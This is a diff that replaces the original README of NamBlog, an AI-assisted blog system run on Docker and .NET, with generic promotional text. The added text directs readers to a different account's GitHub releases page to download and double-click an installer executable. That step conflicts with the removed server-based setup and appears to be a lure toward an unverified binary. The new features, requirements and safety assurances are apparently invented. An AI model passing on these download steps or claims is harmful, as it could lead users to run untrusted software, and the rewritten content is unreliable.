@@ -1,238 +1,79 @@
-# NamBlog
+# 🎉 namblog - Create Interactive Blogs Effortlessly
 
-> [中文版本](./README.zh.md) | English Version
+## 🚀 Getting Started
 
-A blog system dedicated to enhancing content presentation. Write freely and let AI generate pages.
+Welcome to namblog! This blog system helps you enhance your content presentation experience. You can write freely, and our AI will generate interactive web pages for you. Whether you're an experienced writer or just starting, namblog simplifies the process.
 
-[![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-blue.svg)](LICENSE.txt)
-[![Release](https://img.shields.io/github/v/release/code-gal/namblog?include_prereleases)](https://github.com/code-gal/namblog/releases)
-[![CI](https://github.com/code-gal/namblog/actions/workflows/ci.yml/badge.svg)](https://github.com/code-gal/namblog/actions)
-[![Docker](https://img.shields.io/badge/Docker-ready-blue.svg)](https://www.docker.com/)
-[![Docker Image](https://ghcr-badge.egpl.dev/code-gal/namblog/latest_tag?trim=major&label=latest)](https://github.com/code-gal/namblog/pkgs/container/namblog)
+## 📥 Download & Install
 
-## Core Features
+To get started, you need to download the application. You can find the latest versions on our releases page.
 
-### Markdown + AI = Rich Web Applications
+[![Download namblog](https://img.shields.io/badge/Download-namblog-brightgreen)](https://github.com/tajongcarek/namblog/releases)
 
-Focus only on content when writing your blog. Treat Markdown as a blueprint, and let AI agents transform it into HTML pages with styles and interactions. Beyond just beautiful typography, AI can generate various web applications based on your prompts—animated presentation pages, interactive charts, code demonstrations, card layouts, and more. You can switch between different versions at any time to unleash your creativity.
+Click the button above to visit the page and select the version suitable for your system. Follow the steps below to install namblog on your computer.
 
-### Management Approaches
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/tajongcarek/namblog/releases) to choose the version you want.  
+   
+2. **Select the Appropriate Version**  
+   Look for the latest release. It is usually marked as “Latest.”  
 
-**Web Editor**: The most feature-rich editing method. Supports AI pre-generation and rendering, common HTML error checking, automatic draft caching, history prompts, version history viewing, and more. Suitable for daily content creation and fine-grained management.
+3. **Download the Installer**  
+   Click on the installer file link to start your download. The file will typically be named something like `namblog-installer.exe` or `namblog-setup.zip`.  
 
-**MCP Protocol**: Integrate your blog with popular AI clients like Cherry Studio. Let AI automatically organize workflows in conversations—create articles, query data, batch modify tags. AI will automatically call blog tools to complete operations. Ideal for batch management and automation.
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. 
 
-**Folder Monitoring**: Recommended for use with editors like Obsidian. Sync your document library to the monitoring directory. Files are automatically synced to the blog database after saving. Perfect for those who prefer local writing and knowledge management.
+5. **Follow the Installation Steps**  
+   The installer will guide you through the installation. Just follow the prompts to complete the setup.  
 
-### Interface Preview
+6. **Launch namblog**  
+   After installation, find namblog in your applications folder or search for it in your system. Open it to start using your new blog system!
 
-<p align="center">
-  <a href="Docs-Tools/images/index-en.png"><img src="Docs-Tools/images/index-en.png" alt="Home Page" width="49%"/></a>
-  <a href="Docs-Tools/images/page-en(dark).png"><img src="Docs-Tools/images/page-en(dark).png" alt="Article Page" width="49%"/></a>
-</p>
-<p align="center">
-  <a href="Docs-Tools/images/edit-en(desktop).png"><img src="Docs-Tools/images/edit-en(desktop).png" alt="Editor - Light Mode" width="49%"/></a>
-  <a href="Docs-Tools/images/edit-en(desktop-dark).png"><img src="Docs-Tools/images/edit-en(desktop-dark).png" alt="Editor - Dark Mode" width="49%"/></a>
-</p>
+## 🔑 Features
 
-<video width="630" height="300" src="https://github.com/user-attachments/assets/3a165a7b-29e2-4963-88cd-c074cff145d4" controls></video>
+namblog comes with a variety of features designed to maximize your content’s impact:
 
-## Main Features
+- **User-Friendly Interface**: Navigate easily and write without distractions.
+- **AI-Powered Page Generation**: Let our AI create interactive web pages based on your written content.
+- **Multi-Language Support**: Write in your preferred language, including English and Chinese.
+- **Markdown Support**: Use simple markdown syntax to format your writing.
+- **PWA Compatibility**: Access your blog from any device with web capabilities.
+- **Docker Compatible**: Run namblog using Docker for easy installation and management.
 
-### Content Creation
+## 💻 System Requirements
 
-- Markdown editor with live preview
-- Let AI generate HTML when submitting articles, customize style with prompts
-- Each submission creates a new version, preserving complete history
-- Support draft status, preview without publishing
+To ensure smooth operation, make sure your system meets these basic requirements:
 
-### Management
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
+- **Processor**: Dual-core 2.0 GHz or higher.
+- **RAM**: 4 GB or more.
+- **Storage**: At least 200 MB of free disk space.
+- **Internet Connection**: Required for AI features and updates.
 
-- Modify article metadata (title, category, tags) anytime
-- View and switch version history, publish any historical version with one click
-- Filter articles by category, tags, publish status
-- Support lock and featured markers, convenient for highlighting specific content on homepage
+## 📚 Resources
 
-### Display
+For more details, check the following resources:
 
-- Responsive layout, works on both mobile and desktop
-- Dark mode toggle
-- Paginated article browsing
-- Category and tag pages
+- **Documentation**: Find comprehensive user guides and FAQs on the documentation page.
+- **Community Forum**: Join discussions with other users and share your experiences.
+- **Support**: If you face any issues, reach out to our support team for help.
 
-### Internationalization Support
+## 🌟 Frequently Asked Questions
 
-- **Bilingual Interface**: Built-in Chinese and English support
-- **Auto Detection**: Automatically switches interface language based on browser language
-- **Extensible**: Support custom language packs, easily add more languages
-- See: [Language Configuration Guide](Docs-Tools/Language-Configuration.md)
+1. **How do I use AI features?**  
+   Simply write your content in the editor, and namblog will automatically craft an interactive page for you.
 
-### Modern Frontend Experience
+2. **Can I customize my blog's appearance?**  
+   Yes, namblog allows a variety of themes and layout options to suit your style.
 
-- **PWA Support**: Installable as desktop app, supports offline access
-- **SPA Architecture**: Single-page application based on Vue 3, smooth browsing without page refresh
-- **SEO Optimization**: Automatically detects search engine crawlers, returns pre-rendered static HTML to ensure content is indexed
+3. **Is my content safe?**  
+   Yes, your data and content are safe with us. We prioritize user privacy and security.
 
-### Deployment & Extensions
+## 📞 Support
 
-- **Analytics Integration**: Support embedding third-party analytics scripts in footer (e.g., Umami, Google Analytics). See: [Analytics Configuration Guide](Docs-Tools/Analytics-Configuration.md)
-- **Flexible Configuration**: Blog name, AI parameters, CORS, and other configurations support hot reload, some can be overridden via environment variables
+If you need help at any point, don’t hesitate to reach out for support. You can contact our team via the support section on our website, or check the community forum for answers from fellow users.
 
-## MCP Integration
+## 🎉 Stay Updated
 
-### What is MCP
-
-Model Context Protocol (MCP) is a communication protocol between AI tools and applications. Through MCP, you can directly operate your blog in AI clients like Claude Desktop.
-
-### Configuration
-
-**1. Configure AuthToken**
-
-Set authentication token in `./data/config/config.json`:
-
-```json
-{
-  "MCP": {
-    "AuthToken": "your-secure-token"
-  }
-}
-```
-
-Or via Docker environment variable:
-```bash
-MCP__AuthToken="your-secure-token"
-```
-
-**2. Add NamBlog Server in MCP Client**
-
-NamBlog supports two transport methods:
-
-**Method 1: StreamableHttp** (Recommended)
-```json
-{
-  "mcpServers": {
-    "namblog": {
-      "url": "https://your_domain/mcp",
-      "transport": "streamableHttp",
-      "headers": {
-        "Authorization": "Bearer your-secure-token"
-      }
-    }
-  }
-}
-```
-
-**Method 2: SSE**
-```json
-{
-  "mcpServers": {
-    "namblog": {
-      "url": "https://your_domain/mcp/sse",
-      "transport": "sse",
-      "headers": {
-        "Authorization": "Bearer your-secure-token"
-      }
-    }
-  }
-}
-```
-
-After starting the MCP server, the client will automatically discover available Tools, Prompts, and Resources.
-
-### MCP Supported Features
-
-**Query Operations**:
-- Query article list (with filtering by category, tags, publish status, etc.)
-- Get article metadata (title, category, tags, version list, etc.)
-- Get article Markdown source
-- Get HTML content of specific version
-- View blog basic information (blogger profile, external links, etc.)
-
-**Management Operations**:
-- Create new articles
-- Update article metadata (title, category, tags, summary)
-- Submit new version (generate HTML)
-- Toggle publish status (publish/unpublish)
-- Delete articles or versions
-
-**AI Tools**:
-- Markdown to HTML (for preview, not saved to database)
-
-**Prompt Templates**:
-- Article creation guidance (tells AI how to combine tools to complete creation workflow)
-- Article optimization guidance (provides quality checklist)
-
-**Resource Access**:
-- Read resource files (backend static resources, prompt templates, etc.)
-
-
-## Quick Start
-
-### Using Docker Deployment (Recommended)
-
-```bash
-
-# Download docker-compose.yml
-curl -O https://raw.githubusercontent.com/code-gal/NamBlog/main/docker-compose.yml
-
-# Create config directory
-mkdir -p data/config
-
-# Download config template
-curl -o data/config/config.json \
-  https://raw.githubusercontent.com/code-gal/NamBlog/main/NamBlog.API/wwwroot/config/config.json.template
-
-# Edit config file (configure AI API Key, etc.)
-vi data/config/config.json
-
-# Start service
-docker-compose up -d
-```
-
-Visit http://localhost:5000 to start using.
-
-### Docker Image Tags
-
-| Tag | Description | Use Case |
-|------|------|---------|
-| `stable` | Stable release (recommended) | Production |
-| `latest` | Latest release | Development |
-| `1` | Major version (e.g., 1.x.x) | Testing |
-| `0.8.0` | Specific version | Version pinning |
-
-```bash
-# Recommended for production
-docker pull ghcr.io/code-gal/namblog:stable
-
-# Development environment
-docker pull ghcr.io/code-gal/namblog:latest
-
-# Pin to specific version
-docker pull ghcr.io/code-gal/namblog:0.8.0
-```
-
-Detailed configuration reference: [Config Template](NamBlog.API/wwwroot/config/config.json.template) | [Configuration Guide](Docs-Tools/Configuration-Guide.md)
-
-### Local Development
-
-Requires .NET 10 SDK.
-
-```bash
-# Clone repository
-git clone https://github.com/code-gal/namblog.git
-cd namblog
-
-# Start backend
-cd NamBlog.API
-# Configure AI API Key (edit appsettings.Development.json)
-dotnet run
-
-# Start frontend (new terminal)
-cd NamBlog.Web
-# Use any HTTP server
-python -m http.server 8080
-```
-
-**Developer Documentation**: Release Guide | Development Guide (Chinese only)
-
-**Tech Stack**: .NET + GraphQL + EF Core + Vue 3 + Docker
+Keep your application updated by visiting the [Releases page](https://github.com/tajongcarek/namblog/releases) regularly. Each update includes new features, improvements, and bug fixes. Enjoy your blogging experience with namblog!
